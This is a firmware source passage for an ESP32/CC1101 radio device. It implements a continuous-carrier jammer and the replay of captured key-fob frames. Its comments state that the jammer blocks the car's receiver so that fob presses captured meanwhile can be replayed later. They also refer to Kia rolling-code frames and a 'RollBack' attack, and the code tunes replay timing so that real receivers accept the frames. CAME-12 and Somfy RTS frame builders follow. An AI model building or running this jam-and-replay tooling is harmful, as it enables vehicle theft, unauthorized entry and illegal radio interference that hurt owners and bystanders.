  // ── Uniform-pulse refusal ("no-bit-edges") ─────────────────────────────────
  // The RX-side twin of the replayRaw false success (research/19 §1, §2). On this board GDO0
  // is absent, so capture falls back to polling RSSI; the poll rate (~1600 µs, limited by
  // the SPI transaction time) is slower than a Kia V3/V4 short pulse, so the encoder sees a
  // uniform train and the decoders are fed non-data. A real capture came back as uniform
  // ~1600 µs pulses and was still reported as "✓ 512 edges" with has_ctr:true (research/13).
  //
  // A genuine OOK frame is short/long at roughly a 2:1 ratio. So: if essentially every
  // pulse sits within a few percent of the same width, there are no bit edges to decode and
  // this is not a frame. Refuse it with its own reason rather than passing it downstream.
  // Only applied to long buffers — a 20-pulse burst is too few to judge a distribution.
  if(!lastCapGdo0){
    uint32_t uWidth=0;
    if(ks_noBitEdges(rfBuf,rfLen,uWidth)){
      addLog("  ⚠ No bit edges ("+String(rfLen)+" pulses all ~"+String(uWidth)+" µs) — RSSI-poll artefact, not a frame");
      serialEmit(String("{\"event\":\"capture_rejected\",\"reason\":\"no-bit-edges\","
                        "\"pulses\":")+String(rfLen)+",\"width_us\":"+String(uWidth)+
                        ",\"detail\":\"pulse widths are uniform, so there is no short/long modulation to decode; "
                        "RSSI fallback cannot resolve this signal. Real edge capture needs GDO0.\"}");
      rfLen=0; setLed(0,150,65); return false;
    }
  }
  addLog("  ✓ "+String(rfLen)+" edges @ "+String(peak)+" dBm / "+String(rfFreq,2)+" MHz");
  { // Log first 12 pulse widths for USB-serial diagnosis (share with developer if decode fails)
    String pl="  P[0..11]: ";
    for(int i=0;i<12&&i<rfLen;i++){pl+=String(rfBuf[i]);if(i<11&&i<rfLen-1)pl+=",";}
    addLog(pl); }
  beep(2500,50); delay(30); beep(3000,80);
  setLed(0,255,0); delay(300); setLed(0,150,65);
  if(fskCapMode) cc_setCaptureOOK();  // restore OOK after FSK capture
  lastCapDurMs = (uint32_t)(millis()-_cT0);
  return rfLen>18;
}


// ─── Jam (continuous carrier) ─────────────────────────────────────────────────
// Blocks the target frequency with a continuous OOK carrier. The car receives nothing;
// any fob presses during the jam are captured but unused by the car, making them valid for
// later replay. Call stopJam() to return to RX/scan mode.
//
// TWO PATHS, chosen by whether GDO0 is usable:
//
//  · GDO0 available (a revision where it is routed): async TX with GDO0 held HIGH, as
//    before. Arbitrary-RAW replay keeps working on such a board.
//
//  · GDO0 absent (this revision): there is no pin to hold, so the carrier comes from the
//    PA driven by the TX FIFO instead — 64-byte packets of 0xFF at ~8.9 kBaud, each about
//    58 ms, kept going by jamTick() so the carrier survives while the main loop runs.
//    Verified on hardware: MARCSTATE 19 (TX) with TXBYTES draining and no underflow.
//
// The FIFO path must NOT be a blocking loop: C1 has to jam AND watch RSSI AND capture, so
// the refill happens from loop() via jamTick().
bool jamUseFifo=false;          // which path the current jam uses
unsigned long jamLastFeed=0;    // last FIFO top-up, for jamTick()
int  jamUnderruns=0;            // how many times the carrier gapped (must stay 0)
unsigned long jamLastRestart=0; // when the current packet was started
unsigned long jamMaxGapMs=0;    // worst loop() gap seen while jamming

void startJam(float mhz){
  if(mhz<100.0f||mhz>950.0f) return;
  scanActive=false;
  // Path choice. A toggling GPIO 48 is NOT evidence that the CC1101's GDO0 is readable:
  // on this board revision GPIO 48 is the SX1278's DIO0 and the CC1101's GDO0 is not routed
  // at all (research/15, and the vendor firmware's own note that GDO0 is not wired to the
  // ESP32 on this PCB). A toggle can therefore come from the LoRa side, and choosing the
  // async path on that basis would transmit nothing -- the pin would be driven, but it is
  // not the CC1101's TX data input.
  //
  // So the FIFO path is the default: it drives the CC1101's own PA and needs no GDO0.
  // Async is used only when explicitly forced, for a revision where GDO0 really is routed.
  bool gdo0Usable=false;
  if(gdo0Routed){
    pinMode(PIN_GDO0,INPUT);
    unsigned long t=micros(); bool h=false,l=false;
    while(micros()-t<3000){ if(digitalRead(PIN_GDO0)) h=true; else l=true; if(h&&l) break; }
    gdo0Usable=(h&&l);
  }
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  cc_setFreq(mhz);
  SPI.endTransaction();
  if(gdo0Usable){
    jamUseFifo=false;
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_writeReg(0x02,0x2F); cc_strobe(0x36); delay(1);  // GDO0 = HW data input
    SPI.endTransaction();
    pinMode(PIN_GDO0,OUTPUT);
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_strobe(0x35); delay(1);                          // STX
    SPI.endTransaction();
    digitalWrite(PIN_GDO0,HIGH);                        // continuous carrier ON
  } else {
    jamUseFifo=true;
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_writeReg(0x02,0x2E);                             // GDO0 high-Z: not our data path
    cc_writeReg(0x12,0x30);                             // ASK/OOK, SYNC_MODE=0 (no preamble)
    cc_writeReg(0x08,0x00);                             // FIFO, CRC off, fixed length
    cc_writeReg(0x06,255);                              // PKTLEN
    cc_writeReg(0x10,0x48); cc_writeReg(0x11,0x65);     // ~8.9 kBaud -> 64 B is ~58 ms
    cc_strobe(0x36); cc_strobe(0x3B);                   // SIDLE, SFTX
    uint8_t ones[64]; for(int i=0;i<64;i++) ones[i]=0xFF;
    cc_writeBurst(0x3F,ones,64);
    cc_strobe(0x35);                                    // STX
    SPI.endTransaction();
  }
  jamActive=true; jamFreq=mhz;
  jamLastFeed=millis(); jamUnderruns=0; jamMaxGapMs=0;
  setLed(180,0,0);                                      // red = jamming
}

// Keep a FIFO-driven jam alive. Called from loop() while jamActive. Without this the
// 64-byte packet drains in ~58 ms and the carrier stops.
void jamTick(){
  if(!jamActive||!jamUseFifo) return;
  unsigned long now=millis();
  // Sample how long loop() was away; a long gap is what starves the FIFO.
  unsigned long gap=now-jamLastFeed;
  if(gap>jamMaxGapMs) jamMaxGapMs=gap;
  if(gap<8) return;                    // 8 ms << 58 ms of buffer per fill
  jamLastFeed=now;
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  int txb=cc_readStatus(0x3A);         // bit7 underflow, bits6:0 queued
  int marc=cc_readStatus(0x35)&0x1F;
  int queued=txb&0x7F;
  uint8_t ones[64]; for(int i=0;i<64;i++) ones[i]=0xFF;
  // TX is MARCSTATE 19,20. If the packet finished (IDLE 1 or FSTXON 18) or the FIFO ran
  // dry, start a fresh packet; otherwise top the FIFO up to FULL.
  if((txb&0x80)||marc==1||marc==18){
    jamUnderruns++;                    // a gap occurred: the carrier was not continuous
    cc_strobe(0x3B);                   // SFTX: also the only way out of underflow
    cc_writeBurst(0x3F,ones,64);
    cc_strobe(0x35);                   // STX again
    jamLastRestart=now;
  } else {
    // Write only what the FIFO can actually take. Writing more than is free drops the
    // excess and corrupts the byte counter — observed as "txbytes: 73" from a FIFO that
    // holds 64, which is what exposed this. The TX FIFO is 64 bytes (datasheet §11.1).
    int free64=64-queued;
    if(free64>0){
      if(free64>48) free64=48;         // 48 bytes is ~43 ms of carrier per refill
      cc_writeBurst(0x3F,ones,(uint8_t)free64);
    }
  }
  SPI.endTransaction();
}

void stopJam(){
  if(!jamActive) return;
  if(jamUseFifo){
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_strobe(0x36);                   // SIDLE
    cc_strobe(0x3B);                   // SFTX
    cc_writeReg(0x08,0x30);            // restore async RX
    cc_writeReg(0x10,0x4C); cc_writeReg(0x11,0x22);   // restore capture data rate
    cc_writeReg(0x02,0x0D);
    cc_strobe(0x36); delay(1); cc_strobe(0x34);
    SPI.endTransaction();
    jamUseFifo=false;
  } else {
    digitalWrite(PIN_GDO0,LOW);
    pinMode(PIN_GDO0,INPUT);
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    cc_writeReg(0x02,0x0D); cc_strobe(0x36); delay(1); cc_strobe(0x34); // restore RX
    SPI.endTransaction();
  }
  jamActive=false; jamFreq=0.0f;
  setLed(0,150,65);                                   // back to idle green
}

// ─── Replay ───────────────────────────────────────────────────────────────────
// Replay a raw pulse-width array.
//
// `startHigh` is the level of data[0]. Pulses alternate, so data[i] is HIGH when
// (i%2)==startHigh. This used to be hard-coded to HIGH, which inverted every
// level of a capture whose first pulse was actually LOW — the transmitted frame
// then had reversed marking/spacing and no receiver would accept it. Capture
// polarity is now tracked (see rfStartHigh) and passed through.
//
// The default preserves the old call sites that genuinely do start HIGH (the
// protocol builders below generate buf[0] as a HIGH duration by construction).
// ─── Packet-mode raw replay (research/19 §5 step 4) ───────────────────────────
//
// replayRaw() takes an arbitrary list of pulse widths and, on a board with GDO0, bit-bangs
// them. Where GDO0 is absent (this revision) packet mode is the only TX path, and the chip
// sends bits at a register-selected baud — so pulses must be ENCODED rather than timed.
//
// The encoding: pick the smallest pulse width in the frame as one symbol period S, then a
// pulse of width w becomes round(w/S) consecutive bits at that pulse's level. OOK is
// level-based, so a run of 0s is silence and a run of 1s is carrier, which reproduces the
// on/off envelope. The symbol rate is chosen from S, and the datasheet formula is
// invertible closely enough that a TE of 400 us lands within 0.3 us.
//
// Limits, stated plainly: this is not bit-exact. Jitter differs from a bit-banged capture,
// the shortest pulse sets the resolution, and a frame needing more than 64 bytes at that
// resolution cannot be sent in one packet. It reproduces the protocol, not the waveform.
//
// Find DRATE_E/DRATE_M for a symbol period. DRATE = (256+M)*2^E/2^28 * XOSC, so the period
// is 1/DRATE. Searched rather than solved, because the search is cheap and exact.
static bool ks_ccRateForPeriodUs(uint32_t us,uint8_t& dE,uint8_t& dM){
  if(us==0) return false;
  uint32_t bestE=0,bestM=0; double bestErr=1e9;
  for(uint8_t e=0;e<16;e++){
    for(int m=0;m<256;m++){
      double baud=(256.0+m)*(double)(1u<<e)/268435456.0*26000000.0;
      double periodUs=1e6/baud;
      double err=periodUs-(double)us;
      if(err<0) err=-err;
      if(err<bestErr){ bestErr=err; bestE=e; bestM=m; }
    }
  }
  dE=(uint8_t)bestE; dM=(uint8_t)bestM;
  return bestErr<=(((double)us)*0.02);   // accept within 2% of the requested period
}

// Encode a pulse-width frame into OOK bits at symbol period S, packed MSB-first.
// Returns the number of bytes, or 0 if it does not fit / cannot be represented.
static uint8_t ks_ccEncodeFrame(const uint16_t* data,int len,bool startHigh,
                                uint32_t S,uint8_t* out,uint8_t outCap){
  if(len<2||S==0) return 0;
  uint16_t maxBytes=(uint16_t)outCap;
  uint16_t nbits=0;
  uint8_t  cur=0; int nb=0; uint16_t nout=0;
  bool lvl=startHigh;
  for(int i=0;i<len;i++){
    // Number of symbols for this pulse, at least 1 so a short pulse is never dropped.
    uint32_t n=(data[i]+S/2)/S;
    if(n<1) n=1;
    if(n>512) n=512;                        // a >512-symbol pulse is a gap; clamp
    for(uint32_t k=0;k<n;k++){
      if(lvl) cur|=(uint8_t)(0x80>>nb);
      if(++nb==8){
        if(nout>=maxBytes) return 0;        // does not fit: caller falls back
        out[nout++]=cur; cur=0; nb=0;
      }
      nbits++;
    }
    lvl=!lvl;
  }
  if(nb>0){
    if(nout>=maxBytes) return 0;
    out[nout++]=cur;
  }
  return (uint8_t)nout;
}

// Transmit a frame via the TX FIFO. Returns true only if the bytes actually moved.
// Bounded wait on TXBYTES so a wedged radio cannot hang a caller or leave TX running.
static bool ks_ccSendEncoded(float mhz,uint8_t* bytes,uint8_t n,uint8_t dE,uint8_t dM){
  if(n==0||n>64) return false;              // one packet: the FIFO is 64 bytes
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  cc_setFreq(mhz);
  cc_writeReg(0x02,0x2E);                   // GDO0 high-Z: not our data path here
  cc_writeReg(0x12,0x30);                   // ASK/OOK, SYNC_MODE=0 (no preamble/sync)
  cc_writeReg(0x08,0x00);                   // FIFO, CRC off, fixed length
  cc_writeReg(0x06,n);                      // PKTLEN = packet size
  cc_writeReg(0x10,(uint8_t)(0x40|(dE&0x0F)));  // keep CHANBW, set DRATE_E
  cc_writeReg(0x11,dM);
  cc_strobe(0x36); cc_strobe(0x3B);         // SIDLE, SFTX
  cc_writeBurst(0x3F,bytes,n);
  cc_strobe(0x35);                          // STX
  SPI.endTransaction();
  bool done=false;
  unsigned long t0=millis();
  while(millis()-t0<400){
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    int txb=cc_readStatus(0x3A);
    int marc=cc_readStatus(0x35)&0x1F;
    SPI.endTransaction();
    if((txb&0x7F)==0 && (marc==19||marc==20||marc==18||marc==1)){done=true;break;}
    delay(2);
  }
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  cc_strobe(0x36); cc_strobe(0x3B);         // SIDLE, SFTX
  cc_writeReg(0x08,0x30);                   // restore async RX
  cc_writeReg(0x10,0x4C); cc_writeReg(0x11,0x22);   // restore capture data rate
  cc_writeReg(0x02,0x0D);
  cc_strobe(0x36); delay(1); cc_strobe(0x34);
  SPI.endTransaction();
  return done;
}

// Packet-mode replay of a pulse frame, used when GDO0 is not available.
// Returns false if the frame cannot be represented at a usable rate or does not fit.
bool replayViaFifo(float mhz,const uint16_t* data,int len,bool startHigh,int reps){
  if(len<10) return false;
  if(reps<1) reps=1;
  if(reps>5) reps=5;

  // ── Symbol period from the protocol's te, not from min(data) ────────────────
  // Deriving S from the shortest pulse is what research/20 §2 caught: a real Kia V3 frame
  // contains a single 132 us outlier, so min() gave S0=132 and the fit then had to coarsen
  // to 264 us — which quantises the protocol's two symbol widths to
  //    400 us -> 528 us (+32%)   and   800 us -> 792 us (-1%)
  // collapsing the short:long ratio from 2.000:1 to 1.500:1. A PWM receiver distinguishes
  // a 1 from a 0 by that ratio, so the frame was transmittable "by luck" rather than by
  // construction.
  //
  // The protocol's te is the mean of the SHORT cluster, which the frame itself carries:
  // clustering the real frame gives short ~398 us (n=111) and long ~809 us (n=71), ratio
  // 2.033. So te comes from clustering, and an exact rate exists for it —
  //   te = 400 us -> DRATE_E=6, DRATE_M=147 -> 2498.1 baud = 400.2962 us (0.074% error)
  // at which 400 us is 1 symbol and 800 us is 2, preserving the ratio exactly.
  uint32_t cA=0,cB=0;
  static uint32_t tmp[CAP_SZ];
  int tn = (len<(int)CAP_SZ)?len:(int)CAP_SZ;
  for(int i=0;i<tn;i++) tmp[i]=data[i];
  uint32_t S0=0;
  uint32_t teShort=0,teLong=0;
  if(ks_km2(tmp,tn,cA,cB) && cA>0 && cB>cA){
    teShort=(cA<cB)?cA:cB;          // the short cluster is te (its mean)
    teLong =(cA<cB)?cB:cA;
    S0=teShort;
  } else {
    // Clustering failed (a fixed-code frame with one width, or a tiny burst): fall back to
    // the shortest pulse, which is all that is available.
    S0=0xFFFF;
    for(int i=0;i<len;i++) if(data[i]&&data[i]<S0) S0=data[i];
  }
  if(S0<40) return false;                      // below this, real OOK shaping is not achievable

  // ── Trim the true boundary artefacts (research/21 §2.1, corrected) ───────────
  //
  // klTrimToFrame cuts a window around the separator: 20 pulses before it, then one
  // pitch. That window's ends are artefacts of where the cut landed, not protocol
  // symbols, and they were being transmitted:
  //
  //   index 0   132 us   HALF a short pulse -> at S=398 it encodes as 1 symbol = 398 us,
  //                       a 3.0x stretch on the FIRST pulse the receiver sees
  //   index 182 1188 us  the NEXT frame's separator
  //
  // research/21 §2.1 recommended trimming to the separator boundaries, i.e. dropping
  // index 20 (1188 us) as well. MEASURED, that breaks the frame:
  //
  //   [0:183) 183 pulses -> decodes (ctr=38)
  //   [1:183) 182 pulses -> decodes (ctr=38)
  //   [1:182) 181 pulses -> decodes (ctr=38)   <- drop index 0 and 182 only
  //   [20:182) 162 pulses -> NO DECODE          <- also drop the separator
  //   [21:182) 161 pulses -> NO DECODE
  //
  // Index 20 is the frame's own SYNC, not an artefact: research/06 records Kia V3/V4 as
  // "preceded by 12 preamble pairs and a 1000-1500 us sync pulse", and the decoder scans
  // for that preamble to lock on. So the correct trim drops the partial leading pulse and
  // the trailing next-frame separator, and keeps the separator in the payload.
  //
  // Rule: drop leading pulses clearly below the short cluster (a clipped partial), and
  // trailing pulses clearly above the long cluster (a separator belonging to the next
  // frame). Clusters are only trustworthy when clustering succeeded.
  int bFirst=0, bLast=len-1, boundaryPulses=0;
  if(teShort>0 && teLong>teShort){
    uint32_t leadMax=(uint32_t)((double)teShort*0.5);      // 132 vs 398*0.5=199 -> dropped
    uint32_t trailMin=(uint32_t)((double)teLong*1.2);      // 1188 vs 809*1.2=971 -> dropped
    while(bFirst<bLast && data[bFirst]>0 && data[bFirst]<leadMax){ bFirst++; boundaryPulses++; }
    while(bLast>bFirst && data[bLast]>trailMin){ bLast--; boundaryPulses++; }
  } else {
    // Clustering failed, so a partial pulse cannot be identified reliably. Strip only a
    // leading pulse that is far shorter than everything else, which needs no clusters.
    uint32_t mn=0xFFFF,mx=0;
    for(int i=0;i<len;i++){ if(data[i]&&data[i]<mn)mn=data[i]; if(data[i]>mx)mx=data[i]; }
    while(bFirst<bLast && data[bFirst]>0 && data[bFirst]*4<mn){ bFirst++; boundaryPulses++; }
    while(bLast>bFirst && data[bLast]>mx*2){ bLast--; boundaryPulses++; }
  }
  int tlen=bLast-bFirst+1;
  if(tlen<10){
    serialEmit("{\"event\":\"tx_blocked\",\"reason\":\"frame_empty_after_trim\","
               "\"detail\":\"trimming the boundary artefacts left too few pulses to transmit\"}");
    return false;
  }
  const uint16_t* fdata=data+bFirst;
  int flen=tlen;
  // Re-derive S0 from the trimmed frame's own short cluster; the boundary pulses above are
  // exactly the value that pushed S0 below te in the first place.
  {
    uint32_t c1=0,c2=0;
    static uint32_t tb[CAP_SZ];
    int tn=(flen<(int)CAP_SZ)?flen:(int)CAP_SZ;
    for(int i=0;i<tn;i++) tb[i]=fdata[i];
    if(ks_km2(tb,tn,c1,c2) && c1>0 && c2>c1){
      teShort=(c1<c2)?c1:c2; teLong=(c1<c2)?c2:c1;
      S0=teShort;
      if(S0<40) return false;
    }
  }

  // ── Try the correct symbol rate first, then integer multiples of te only ────
  //
  // Coarsening by NON-multiples of te is what produced the 1.5:1 ratio, so the search is
  // restricted to te, 2*te, 3*te ... A coarser multiple of te keeps the ratio exact (at
  // 2*te a 400 us pulse is 0.5 symbols, which rounds to 1 -> 800 us, and that DOES break
  // the ratio; hence the guard below, which refuses rather than degrades).
  static uint8_t enc[64];
  uint32_t S=S0;
  uint8_t  n=0, dE=0, dM=0, usedMult=0;
  for(int mult=1; mult<=4; mult++){
    S=S0*(uint32_t)mult;
    uint8_t e=0,m=0;
    if(!ks_ccRateForPeriodUs(S,e,m)) continue;
    uint8_t nn=ks_ccEncodeFrame(fdata,flen,startHigh,S,enc,sizeof(enc));
    if(nn>0){ n=nn; dE=e; dM=m; usedMult=(uint8_t)mult; break; }
  }
  if(n==0){
    serialEmit("{\"event\":\"tx_blocked\",\"reason\":\"frame_too_long\","
               "\"detail\":\"the frame needs more than 64 bytes even at 4x the protocol te, "
               "so it cannot be sent in one FIFO packet at a valid symbol rate\"}");
    return false;
  }

  // ── Ratio guard (research/20 §2.2) ─────────────────────────────────────────
  // The recovered short and long widths must still look like the protocol's. Without this,
  // a grid that fits but distorts the ratio would transmit a frame no PWM receiver accepts,
  // and a bench failure would be unattributable. Refusing is the honest outcome.
  //
  // Requires: each width within 15% of te, and long/short > 1.6. Both hold exactly at
  // S = te (2.000:1) and both fail at S = 0.66*te (1.500:1), so this catches the case above.
  if(teShort>0 && teLong>teShort){
    uint32_t rs=(uint32_t)((teShort+S/2)/S)*S;   // recovered short
    uint32_t rl=(uint32_t)((teLong +S/2)/S)*S;   // recovered long
    if(rs==0) rs=S;
    double shortErr = (double)rs/(double)teShort - 1.0;
    if(shortErr<0) shortErr=-shortErr;
    double ratio = (rs>0) ? (double)rl/(double)rs : 0.0;
    if(shortErr>=0.15 || ratio<=1.6){
      serialEmit(String("{\"event\":\"tx_blocked\",\"reason\":\"symbol_rate_distorts\",")+
        "\"symbol_us\":"+String(S)+",\"te_short_us\":"+String(teShort)+
        ",\"te_long_us\":"+String(teLong)+",\"recovered_short_us\":"+String(rs)+
        ",\"recovered_long_us\":"+String(rl)+",\"ratio\":"+String(ratio,3)+
        ",\"short_err_pct\":"+String(shortErr*100.0,1)+
        ",\"detail\":\"no symbol period that fits the packet reproduces the protocol's "
        "short:long ratio, so the frame is NOT transmitted rather than sent distorted\"}");
      return false;
    }
  }

  // Report the resolution actually used, and the worst-case timing error, so a caller can
  // tell a faithful transmission from a coarse one rather than assuming.
  serialEmit(String("{\"event\":\"replay_fifo\",\"symbol_us\":")+String(S)+
             ",\"te_short_us\":"+String(teShort)+",\"te_long_us\":"+String(teLong)+
             ",\"mult\":"+String(usedMult)+",\"bytes\":"+String(n)+
             ",\"worst_err_bound_us\":"+String((teShort>0)?(S/2):(S0/2))+","+
             // research/21 §2.1 asked for this to be visible: how many boundary pulses were
             // dropped, and how many pulses the payload actually contains.
             "\"boundary_pulses\":"+String(boundaryPulses)+
             ",\"payload_pulses\":"+String(flen)+",\"input_pulses\":"+String(len)+","+
             "\"ratio_ok\":"+String((teLong>teShort)?"true":"false")+"}");
  // research/20 §3: apply `reps` here as the GDO0 path does. The original comment claimed
  // repetition was "handled inside the packet", which is false — one packet is one frame —
  // so callers asking for 3 got 1 on this path. Rolling-code receivers commonly expect the
  // repetition a real fob sends, so send the packet `reps` times.
  bool ok=false;
  for(int r=0;r<reps;r++){
    if(!ks_ccSendEncoded(mhz,enc,n,dE,dM)){
      serialEmit("{\"event\":\"tx_blocked\",\"reason\":\"fifo_tx_failed\",\"rep\":"+
                 String(r+1)+"}");
      return false;
    }
    ok=true;
    if(r+1<reps) delay(20);        // inter-frame gap, as the GDO0 path uses (30 ms)
  }
  return ok;
}

bool replayRaw(float mhz,uint16_t* data,int len,int reps=3,bool startHigh=true){
  if(len<10) return false;
  // TX brownout guard: the CC1101 PA current spike can sag a weak pack below the MCU
  // brown-out threshold mid-burst, corrupting the transmission or resetting the device.
  // Refuse TX when a present gauge reports the pack under the TX floor.  Gauge-absent
  // (battPct==0, e.g. USB/bench power) never blocks TX.
  readBatt();
  if(battPct > 0 && battV > 0 && battV < TX_BATT_FLOOR_V){
    serialEmit("{\"event\":\"tx_blocked\",\"reason\":\"low_battery\",\"v\":" + String(battV,2) + "}");
    return false;
  }
  // ── TX path selection (research/19 §1, §5 step 4) ───────────────────────────
  // The bit-bang below requires PIN_GDO0 to actually be the CC1101's async TX data input.
  // On this revision GPIO 48 is the SX1278's DIO0 and the CC1101's GDO0 is not routed
  // (research/14), so bit-banging toggles the LoRa module's pin and this function used to
  // `return true` regardless — reporting a successful transmission of nothing. Every caller
  // then said ok:true, and C2 would report a completed RollBack having sent nothing.
  //
  // So: default to packet mode, which needs no GDO0 and is the only path that works on this
  // revision. The bit-bang path is used only when explicitly forced, for a board where GDO0
  // really is routed -- a toggle alone cannot select it, because GPIO 48 belongs to the
  // SX1278's DIO0 here and a toggle can come from the LoRa side. If the forced async path
  // turns out to be dead, refuse explicitly rather than claim success.
  bool txPathLive=false;
  if(gdo0Routed){
    // Force-pins the async TX input to the GDO0 pad and drives a continuous carrier. Must be
    // a compile-time opt-out, not a hardware probe: the probe cannot distinguish the CC1101's
    // GDO0 from the SX1278's DIO0.
    pinMode(PIN_GDO0,OUTPUT);
    cc_writeReg(0x02,0x2F); cc_strobe(0x36); delay(1);   // GDO0 = HW data input
    pinMode(PIN_GDO0,INPUT);
    unsigned long t=micros(); bool h=false,l=false;
    while(micros()-t<3000){ if(digitalRead(PIN_GDO0)) h=true; else l=true; if(h&&l) break; }
    txPathLive=(h&&l);
  }
  if(!txPathLive){
    // No GDO0: packet mode is the only way out of this board. Try it once, then report
    // honestly. Repetition is handled inside the encoder's packet, so `reps` is not applied
    // here — a packet already contains the whole frame once.
    bool ok=replayViaFifo(mhz,data,len,startHigh,reps);
    lastReplayPath = ok ? REPLAY_VIA_FIFO : REPLAY_NONE;
    if(!ok){
      serialEmit("{\"event\":\"tx_blocked\",\"reason\":\"tx_path_dead\","
                 "\"detail\":\"PIN_GDO0 does not toggle and the frame cannot be sent in packet "
                 "mode, so nothing was transmitted. No success is reported.\"}");
    }
    return ok;
  }
  lastReplayPath = REPLAY_VIA_GDO0;
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  cc_setFreq(mhz);
  cc_writeReg(0x02,0x2F); cc_strobe(0x36); delay(1);
  SPI.endTransaction();
  pinMode(PIN_GDO0,OUTPUT);
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  cc_strobe(0x35); delay(1);
  SPI.endTransaction();
  for(int rep=0;rep<reps;rep++){
    noInterrupts(); bool st=startHigh;
    for(int i=0;i<len;i++){digitalWrite(PIN_GDO0,st?HIGH:LOW);delayMicroseconds(data[i]);st=!st;}
    digitalWrite(PIN_GDO0,LOW); interrupts(); delay(30);
  }
  pinMode(PIN_GDO0,INPUT);
  SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
  cc_writeReg(0x02,0x0D); cc_strobe(0x36); delay(1); cc_strobe(0x34);
  SPI.endTransaction();
  // Confirm chip-side that the radio actually left RX, rather than assuming the burst
  // happened because the loop ran. MARCSTATE 19,20 = TX; 22 = underflow (also TX-side).
  {
    SPI.beginTransaction(SPISettings(6000000,MSBFIRST,SPI_MODE0));
    int marc=cc_readStatus(0x35)&0x1F;
    SPI.endTransaction();
    if(marc!=19&&marc!=20&&marc!=22&&marc!=18&&marc!=1){
      serialEmit(String("{\"event\":\"tx_blocked\",\"reason\":\"tx_no_state\",\"marcstate\":")+String(marc)+"}");
      lastReplayPath = REPLAY_NONE;
      return false;
    }
  }
  return true;
}

// CAME-12 signal builder
bool buildCame12(uint16_t code,uint16_t te,uint16_t* buf,int& len){
  if(te<50||te>3000) return false; len=0;
  for(int i=0;i<32&&len+2<255;i++){buf[len++]=te;buf[len++]=te;}
  for(int b=11;b>=0&&len+4<255;b--){
    bool bit=(code>>b)&1;
    if(bit){buf[len++]=te;buf[len++]=2*te;}
    else{buf[len++]=2*te;buf[len++]=te;}
  }
  if(len+2<255){uint32_t gap=(uint32_t)20*te; buf[len++]=te; buf[len++]=(uint16_t)(gap>65000?65000:gap);}
  return len>0;
}

// Somfy RTS OOK timing builder
// Reconstructs the full 7-byte frame (checksum + obfuscation) then generates
// the alternating HIGH/LOW duration stream for replayRaw() (buf[0]=HIGH, buf[1]=LOW …).
// Protocol: T=604µs, 2× HW sync (2T H+L), SW sync (4.5T H), T/2 gap, 56 data bits.
// Data: '1'=T-H + T-L, '0'=T-L + T-H (Manchester-like, MSB first).
// Returns number of entries written to buf (buf must be ≥200 entries), 0 on error.
int buildSomfyRTS(uint8_t ctrl,uint16_t roll,uint32_t addr,uint16_t* buf,int maxLen){
  const uint16_t T=604;
  // Build clear-text frame
  uint8_t f[7];
  f[0]=0xA7;
  f[1]=(ctrl&0xF)<<4;           // ctrl high nibble, checksum slot = 0
  f[2]=(roll>>8)&0xFF;
  f[3]= roll    &0xFF;
  f[4]= addr    &0xFF;          // address little-endian
  f[5]=(addr>>8)&0xFF;
  f[6]=(addr>>16)&0xFF;
  // Checksum: XOR all nibbles (with f[1] low nibble = 0), place into f[1] low nibble
  uint8_t cks=0;
  for(int i=0;i<7;i++) cks^=(f[i]>>4)^(f[i]&0xF);
  f[1]|=cks&0xF;
  // Obfuscate: each byte XOR with previous
  for(int i=1;i<7;i++) f[i]^=f[i-1];

  // Build timing stream. State tracking: replayRaw starts HIGH (buf[0] = first HIGH dur).
  // SOMFY_ADD extends current run if same polarity, else starts a new slot.
  int len=0; bool isHi=true;
  #define SOMFY_ADD(hi,dur) do{ \
    uint16_t _d=(uint16_t)(dur); \
    if(len==0){buf[len++]=_d;isHi=(hi);} \
    else if((hi)==isHi){uint32_t _v=(uint32_t)buf[len-1]+_d;buf[len-1]=(uint16_t)(_v>60000?60000:_v);} \
    else if(len<maxLen){buf[len++]=_d;isHi=(hi);} \
  }while(0)

  // 2× hardware sync (2T HIGH, 2T LOW each)
  SOMFY_ADD(true,2*T); SOMFY_ADD(false,2*T);
  SOMFY_ADD(true,2*T); SOMFY_ADD(false,2*T);
  // Software sync: 4.5T HIGH, then T/2 LOW gap before data
  SOMFY_ADD(true,4*T+T/2);
  SOMFY_ADD(false,T/2);
  // 56 data bits, MSB first: '1'=H+L, '0'=L+H
  for(int b=0;b<7;b++){
    for(int bit=7;bit>=0;bit--){
      bool one=(f[b]>>bit)&1;
      if(one){SOMFY_ADD(true,T);SOMFY_ADD(false,T);}
      else   {SOMFY_ADD(false,T);SOMFY_ADD(true,T);}
    }
  }
  SOMFY_ADD(false,T); // trailing LOW
  #undef SOMFY_ADD
  return (len>10)?len:0;
}

// ─── Generic OOK-PWM frame builder ────────────────────────────────────────────
// Many garage/gate protocols share the same physical encoding: a long preamble
// of short-pulse + short-gap pairs, then N data bits where '1' = short-H +
// long-L and '0' = long-H + short-L (long = 2× short), followed by a quiet
// gap. This single helper is used by every fixed/structural rolling protocol
// builder below.
//   data         : up to 64 data bits, MSB first
//   nBits        : number of bits to transmit
//   preambleN    : count of (short-H + short-L) preamble pairs
//   te           : short pulse width (µs)
//   gapAfter     : LOW gap after the data (µs, clamped to 60 000)
//   buf/maxLen   : output timing array (alternating H, L durations)
// Returns count of timing entries written, or 0 on overflow / bad params.
static int buildOokPwm(uint64_t data, int nBits, int preambleN,
                       uint16_t te, uint32_t gapAfter,
                       uint16_t* buf, int maxLen){
  if(te < 50 || te > 5000 || nBits < 4 || nBits > 64) return 0;
  if(preambleN < 1) preambleN = 1;
  uint16_t te2 = (uint16_t)(te * 2);
  int len = 0;
  // Preamble: short H + short L, repeated
  for(int i = 0; i < preambleN && len + 2 <= maxLen; i++){
    buf[len++] = te;
    buf[len++] = te;
